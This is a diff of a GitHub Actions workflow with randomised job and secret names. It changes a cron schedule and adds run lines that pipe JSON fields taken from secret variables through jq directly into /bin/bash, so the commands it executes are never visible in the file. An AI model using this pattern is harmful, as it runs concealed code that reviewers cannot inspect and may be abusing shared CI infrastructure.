@@ -3,7 +3,8 @@ name: caocao19870104
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '3 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: caocao19870104
         env:
-          dxwib8320: ${{ secrets.dxwib8320 }}
+          bx87075: ${{ secrets.bx87075 }}
         run: |
-          echo $dxwib8320 | jq -r .apko7389 | /bin/bash
-          echo $aj17 | jq -r .sx84 | /bin/bash
-          echo $taeo24745 | jq -r .byru11738 | /bin/bash
-          echo $mff53 | jq -r .xbcsn821 | /bin/bash
-          echo $qw63 | jq -r .i85706 | /bin/bash
-          echo $w32779 | jq -r .usyr39477 | /bin/bash
-          echo $koq351 | jq -r .easqc18 | /bin/bash
+          echo $bx87075 | jq -r .voo4193 | /bin/bash
+          echo $zr35 | jq -r .p16 | /bin/bash
+          echo $l6 | jq -r .nc63868 | /bin/bash
+          echo $sya46 | jq -r .k5101 | /bin/bash
+          echo $gnu87318 | jq -r .ag96193 | /bin/bash
+          echo $ma651 | jq -r .milt61492 | /bin/bash
+          echo $kyjvg6511 | jq -r .qzbfw50 | /bin/bash
+          echo $aplc1357 | jq -r .vg3230 | /bin/bash
+          echo $fomdu32 | jq -r .kbejg93579 | /bin/bash
+          echo $on2 | jq -r .q69368 | /bin/bash
+          echo $zg68 | jq -r .k4599 | /bin/bash
 
